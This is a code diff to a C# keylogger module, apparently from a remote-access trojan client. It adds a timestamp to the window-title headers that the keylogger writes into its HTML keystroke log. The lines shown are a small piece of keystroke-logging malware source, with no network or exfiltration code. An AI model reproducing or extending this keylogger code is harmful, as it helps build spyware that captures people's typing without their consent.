@@ -97,7 +97,10 @@ namespace xClient.Core.Keylogger
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" + activeWindowTitle + "</b>]</p><br>");
+                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
+                    + activeWindowTitle + " - " 
+                    + DateTime.Now.ToString("HH:mm") 
+                    + "</b>]</p><br>");
             }
 
             if (_pressedKeys.IsModifierKeysSet())
